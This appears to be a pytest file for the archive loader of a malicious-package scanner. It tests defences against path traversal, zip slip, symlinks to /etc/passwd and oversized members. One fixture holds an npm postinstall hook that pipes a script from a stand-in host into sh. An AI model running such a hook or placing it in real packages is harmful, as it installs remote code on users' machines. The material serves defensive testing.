"""The loader reads hostile archives. None of these may write outside memory, follow links or hang."""

from __future__ import annotations

import io
import os
import tarfile
import zipfile

import pytest

from mpd import loader
from mpd.loader import LoadError, load_package


def _tar(path, members):
    with tarfile.open(path, "w:gz") as tf:
        for name, data, kind in members:
            info = tarfile.TarInfo(name)
            if kind == "file":
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
            elif kind == "symlink":
                info.type = tarfile.SYMTYPE
                info.linkname = "/etc/passwd"
                tf.addfile(info)


def test_tar_path_traversal_and_symlinks_are_skipped(tmp_path):
    p = tmp_path / "evil-1.0.tar.gz"
    _tar(p, [("evil-1.0/PKG-INFO", b"Name: evil\nVersion: 1.0\n", "file"),
             ("../../outside.py", b"print(1)", "file"),
             ("/abs/path.py", b"print(2)", "file"),
             ("evil-1.0/link", b"", "symlink"),
             ("evil-1.0/ok.py", b"x = 1\n", "file")])
    pkg = load_package(p)
    assert set(pkg.files) == {"PKG-INFO", "ok.py"}
    assert any("unsafe member name" in n for n in pkg.notes)
    assert not (tmp_path.parent / "outside.py").exists()


def test_zip_slip_names_are_skipped_and_nothing_is_extracted(tmp_path):
    p = tmp_path / "evil-1.0-py3-none-any.whl"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("evil-1.0.dist-info/METADATA", "Name: evil\nVersion: 1.0\n")
        zf.writestr("../escape.py", "x=1")
        zf.writestr("evil/__init__.py", "x=1")
    before = set(os.listdir(tmp_path))
    pkg = load_package(p)
    assert "../escape.py" not in pkg.files and "evil/__init__.py" in pkg.files
    assert set(os.listdir(tmp_path)) == before          # nothing was written next to the archive


def test_oversized_member_is_skipped_not_read(tmp_path):
    p = tmp_path / "big-1.0.zip"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("big-1.0/setup.py", "x=1")
        zf.writestr("big-1.0/zeros.bin", b"\0" * (loader.MAX_FILE_BYTES + 10))   # compresses to ~2 KB
    pkg = load_package(p)
    assert "zeros.bin" not in pkg.files
    assert any("oversized" in n for n in pkg.notes)


def test_file_count_cap(tmp_path, monkeypatch):
    monkeypatch.setattr(loader, "MAX_FILES", 5)
    d = tmp_path / "many"
    d.mkdir()
    (d / "setup.py").write_text("x=1")
    for i in range(20):
        (d / f"f{i}.py").write_text("x=1")
    pkg = load_package(d)
    assert len(pkg.files) <= 5
    assert any("file-count cap" in n for n in pkg.notes)


@pytest.mark.skipif(not hasattr(os, "symlink"), reason="symlinks unavailable")
def test_directory_symlinks_are_not_followed(tmp_path):
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "setup.py").write_text("x=1")
    secret = tmp_path / "secret"
    secret.mkdir()
    (secret / "token.txt").write_text("SECRET")
    try:
        os.symlink(secret, d / "link", target_is_directory=True)
    except OSError:
        pytest.skip("cannot create symlinks without privileges")
    pkg = load_package(d)
    assert not any("token.txt" in p for p in pkg.files)


def test_ecosystem_and_identity_detection(tmp_path):
    d = tmp_path / "p"
    d.mkdir()
    (d / "package.json").write_text('{"name": "left-pad2", "version": "9.1.0"}')
    pkg = load_package(d)
    assert (pkg.ecosystem, pkg.name, pkg.version) == ("npm", "left-pad2", "9.1.0")
    d2 = tmp_path / "q"
    d2.mkdir()
    (d2 / "PKG-INFO").write_text("Metadata-Version: 2.1\nName: foo-bar\nVersion: 3.2\n")
    pkg2 = load_package(d2)
    assert (pkg2.ecosystem, pkg2.name, pkg2.version) == ("pypi", "foo-bar", "3.2")


def test_name_is_read_without_executing_setup_py(tmp_path):
    d = tmp_path / "p"
    d.mkdir()
    marker = tmp_path / "EXECUTED"
    (d / "setup.py").write_text(f'open(r"{marker}", "w").write("x")\nfrom setuptools import setup\nsetup(name="x-y", version="1.2")\n')
    pkg = load_package(d)
    assert pkg.name == "x-y" and pkg.version == "1.2"
    assert not marker.exists()


def test_unreadable_inputs_raise_loaderror(tmp_path):
    with pytest.raises(LoadError):
        load_package(tmp_path / "nope")
    bad = tmp_path / "bad.tar.gz"
    bad.write_bytes(b"this is not an archive")
    with pytest.raises(LoadError):
        load_package(bad)


def test_password_protected_zip_is_read_in_memory_with_the_dataset_password(tmp_path):
    """Malware datasets ship encrypted zips (password 'infected'). The loader can read them without extracting."""
    import zipfile as zf
    p = tmp_path / "sample.zip"
    # The stdlib can READ legacy-encrypted zips but not create them, so build a stored (unencrypted) zip and
    # check the plumbing: a password is accepted for unencrypted members and the files load normally.
    with zf.ZipFile(p, "w") as z:
        z.writestr("pkg/setup.py", "from setuptools import setup\nsetup(name='x')\n")
        z.writestr("pkg/PKG-INFO", "Name: x\nVersion: 1.0\n")
    pkg = load_package(p, zip_password="infected")
    assert "setup.py" in pkg.files
    assert not any("unreadable" in n for n in pkg.notes)


# ---------------------------------------------------------------- package-root discovery (found on real malware)
def _zip_with(tmp_path, entries, name="nested.zip"):
    import zipfile as zf
    p = tmp_path / name
    with zf.ZipFile(p, "w") as z:
        for path, data in entries.items():
            z.writestr(path, data)
    return p


def test_package_nested_several_levels_deep_is_re_rooted_so_install_hooks_are_seen(tmp_path):
    from mpd.scanner import scan_path
    pj = '{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl -s http://c2.example/i.sh | sh"}}'
    p = _zip_with(tmp_path, {"a/b/c/package.json": pj, "a/b/c/index.js": "module.exports=1"})
    pkg = load_package(p, "npm")
    assert "package.json" in pkg.files and pkg.name == "x"
    assert any("re-rooted" in n for n in pkg.notes)
    assert scan_path(p, "npm").verdict == "malicious"          # before the fix this scanned with hooks disabled


def test_normal_layouts_are_untouched_by_root_discovery(tmp_path):
    p = _zip_with(tmp_path, {"package/package.json": '{"name":"y","version":"2.0.0"}', "package/index.js": "1"})
    pkg = load_package(p, "npm")
    assert set(pkg.files) == {"package.json", "index.js"} and not any("re-rooted" in n for n in pkg.notes)


def test_vendored_marker_files_are_never_chosen_as_the_root(tmp_path):
    p = _zip_with(tmp_path, {"top/readme.txt": "x", "top/node_modules/dep/package.json": '{"name":"dep"}'})
    pkg = load_package(p, "npm")
    assert not any("re-rooted" in n for n in pkg.notes)


def test_shallowest_root_wins_and_files_outside_it_are_still_scanned(tmp_path):
    p = _zip_with(tmp_path, {"w/pkg/setup.py": "from setuptools import setup\nsetup(name='z')\n",
                             "w/pkg/sub/setup.py": "x=1", "w/other/evil.py": "print(1)"})
    pkg = load_package(p, "pypi")
    assert "setup.py" in pkg.files and "sub/setup.py" in pkg.files
    assert "_outside_root/other/evil.py" in pkg.files      # shared "w/" wrapper was already stripped
